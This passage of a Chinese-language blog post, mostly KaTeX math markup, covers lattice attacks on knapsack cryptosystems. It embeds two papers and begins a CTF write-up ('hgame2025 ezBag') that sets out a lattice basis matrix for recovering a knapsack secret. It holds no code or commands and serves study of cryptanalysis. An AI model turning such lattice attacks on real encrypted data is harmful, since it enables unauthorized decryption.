style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="格攻击相关论文"><a class="markdownIt-Anchor" href="#格攻击相关论文"></a> 格攻击相关论文</h2><ul><li>这篇论文是介绍背包攻击的几个方法，其中就包含了格攻击，细读之后发现该论文只是介绍方法，已经怎么造格，并没有具体的证明。</li></ul><div class="row">    <embed src="Merkle_Hellman_Attacks.pdf" width="100%" height="550" type="application/pdf"></div><ul><li>对于格攻击的具体证明，即证明消息的二进制序列构成的向量是那个格中的最短向量。</li></ul><div class="row">    <embed src="p229-lagarias.pdf" width="100%" height="550" type="application/pdf"></div><h2 id="题目1_"><a class="markdownIt-Anchor" href="#题目1_"></a> 题目1_</h2><h2 id="题目2_"><a class="markdownIt-Anchor" href="#题目2_"></a> 题目2_</h2><h2 id="题目3_hgame2025_ezbag"><a class="markdownIt-Anchor" href="#题目3_hgame2025_ezbag"></a> 题目3_hgame2025_ezBag</h2><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><msub><mo stretchy="false">]</mo><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>1</mn><msub><mo stretchy="false">]</mo><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>2</mn><msub><mo stretchy="false">]</mo><mn>1</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>3</mn><msub><mo stretchy="false">]</mo><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><msub><mo stretchy="false">]</mo><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>1</mn><msub><mo stretchy="false">]</mo><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>2</mn><msub><mo stretchy="false">]</mo><mn>2</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>3</mn><msub><mo stretchy="false">]</mo><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><msub><mo stretchy="false">]</mo><mn>63</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>1</mn><msub><mo stretchy="false">]</mo><mn>63</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>2</mn><msub><mo stretchy="false">]</mo><mn>63</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>3</mn><msub><mo stretchy="false">]</mo><mn>63</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><msub><mo stretchy="false">]</mo><mn>64</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>1</mn><msub><mo stretchy="false">]</mo><mn>64</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>2</mn><msub><mo stretchy="false">]</mo><mn>64</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mn>3</mn><msub><mo stretchy="false">]</mo><mn>64</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mi>a</mi><mi>g</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mi>a</mi><mi>g</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mi>a</mi><mi>g</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mi>a</mi><mi>g</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}x_1&amp;x_2&amp;\dots&amp;x_{n-1}&amp;x_{n}&amp;-1&amp;-1&amp;-1&amp;-1\end{bmatrix}*\begin{bmatrix}2&amp;0&amp;\dots&amp;0&amp;0&amp;list[0]_1&amp;list[1]_1&amp;list[2]_1&amp;list[3]_1\\0&amp;2&amp;\dots&amp;0&amp;0&amp;list[0]_2&amp;list[1]_2&amp;list[2]_2&amp;list[3]_2\\\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots\\0&amp;0&amp;\dots&amp;2&amp;0&amp;list[0]_{63}&amp;list[1]_{63}&amp;list[2]_{63}&amp;list[3]_{63}\\0&amp;0&amp;\dots&amp;0&amp;2&amp;list[0]_{64}&amp;list[1]_{64}&amp;list[2]_{64}&amp;list[3]_{64}\\1&amp;1&amp;\dots&amp;1&amp;1&amp;bag[0]&amp;0&amp;0&amp;0\\1&amp;1&amp;\dots&amp;1&amp;1&amp;0&amp;bag[1]&amp;0&amp;0\\1&amp;1&amp;\dots&amp;1&amp;1&amp;0&amp;0&amp;bag[2]&amp;0\\1&amp;1&amp;\dots&amp;1&amp;1&amp;0&amp;0&amp;0&amp;bag[3]\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:11.459999999999999em;vertical-align:-5.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.963945000000002em;"><span style="top:1.6500649999999992em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:0.5000649999999993em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-0.09593500000000077em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-0.6919350000000009em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-1.287935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-1.883935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.479935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.075935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.671935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.267935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.8639350000000015em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.4599350000000015em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-6.055935000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-6.651935000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-6.722925000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-7.963945000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.450085em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span 